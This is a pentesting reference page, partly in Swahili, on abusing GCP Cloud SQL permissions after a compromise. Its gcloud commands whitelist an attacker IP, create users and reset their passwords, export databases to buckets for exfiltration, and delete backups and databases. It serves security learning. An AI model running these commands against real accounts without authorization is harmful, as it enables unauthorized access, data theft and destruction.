# GCP - Cloud SQL Post Exploitation

{{#include ../../../banners/hacktricks-training.md}}

## Cloud SQL

Kwa habari zaidi kuhusu Cloud SQL angalia:

{{#ref}}
../gcp-services/gcp-cloud-sql-enum.md
{{#endref}}

### `cloudsql.instances.update`, ( `cloudsql.instances.get`)

To connect to the databases you **unahitaji tu ufikiaji wa port ya database** and know the **username** and **password**, there isn't any IAM requirements. So, an easy way to get access, supposing that the database has a public IP address, is to update the allowed networks and **kuruhusu anwani yako ya IP kuifikia**.

<details>

<summary>Ruhusu IP yako na uungane na database</summary>
```bash
# Use --assign-ip to make the database get a public IPv4
gcloud sql instances patch $INSTANCE_NAME \
--authorized-networks "$(curl ifconfig.me)" \
--assign-ip \
--quiet

mysql -h <ip_db> # If mysql

# With cloudsql.instances.get you can use gcloud directly
gcloud sql connect mysql --user=root --quiet
```
</details>

Inawezekana pia kutumia **`--no-backup`** ku**haribu chelezo za hifadhidata**.

Kama hizi ndizo mahitaji, sina uhakika kabisa ni kwa ajili gani ruhusa **`cloudsql.instances.connect`** na **`cloudsql.instances.login`**. Ikiwa unajua, tuma PR!

### `cloudsql.users.list`

Pata **orodha ya watumiaji wote** wa hifadhidata:

<details>

<summary>Orodha ya watumiaji wa hifadhidata</summary>
```bash
gcloud sql users list --instance <intance-name>
```
</details>

### `cloudsql.users.create`

Ruhusa hii inaruhusu **kuunda mtumiaji mpya ndani ya** hifadhidata:

<details>

<summary>Unda mtumiaji wa hifadhidata</summary>
```bash
gcloud sql users create <username> --instance <instance-name> --password <password>
```
</details>

### `cloudsql.users.update`

Ruhusa hii inaruhusu **kusasisha mtumiaji ndani ya hifadhidata**. Kwa mfano, unaweza kubadilisha nenosiri lake:

<details>

<summary>Sasisha nenosiri la mtumiaji</summary>
```bash
gcloud sql users set-password <username> --instance <instance-name> --password <password>
```
</details>

### `cloudsql.instances.restoreBackup`, `cloudsql.backupRuns.get`

Nakili za akiba zinaweza kuwa na **taarifa nyeti za zamani**, kwa hivyo inafaa kuzikagua.\
**Rejesha nakala ya akiba** ndani ya hifadhidata:

<details>

<summary>Rejesha nakala ya hifadhidata</summary>
```bash
gcloud sql backups restore <backup-id> --restore-instance <instance-id>
```
</details>

Ili kufanya hivyo kwa njia ya siri zaidi inashauriwa kuunda instance mpya ya SQL na kurejesha data hapo badala ya katika databases zinazotumika sasa.

### `cloudsql.backupRuns.delete`

Ruhusa hii inaruhusu kufuta backups:

<details>

<summary>Futa backup</summary>
```bash
gcloud sql backups delete <backup-id> --instance <instance-id>
```
</details>

### `cloudsql.instances.export`, `storage.objects.create`

**Hamisha hifadhidata** kwenye Cloud Storage Bucket ili uweze kuifikia kutoka huko:

<details>

<summary>Hamisha hifadhidata kwenye bucket</summary>
```bash
# Export sql format, it could also be csv and bak
gcloud sql export sql <instance-id> <gs://bucketName/fileName> --database <db>
```
</details>

### `cloudsql.instances.import`, `storage.objects.get`

**Ingiza hifadhidata** (kuandika juu) kutoka Cloud Storage Bucket:

<details>

<summary>Ingiza hifadhidata kutoka Cloud Storage Bucket</summary>
```bash
# Import format SQL, you could also import formats bak and csv
gcloud sql import sql <instance-id> <gs://bucketName/fileName>
```
</details>

### `cloudsql.databases.delete`

Futa database kutoka kwenye db instance:

<details>

<summary>Futa database</summary>
```bash
gcloud sql databases delete <db-name> --instance <instance-id>
```
</details>

{{#include ../../../banners/hacktricks-training.md}}
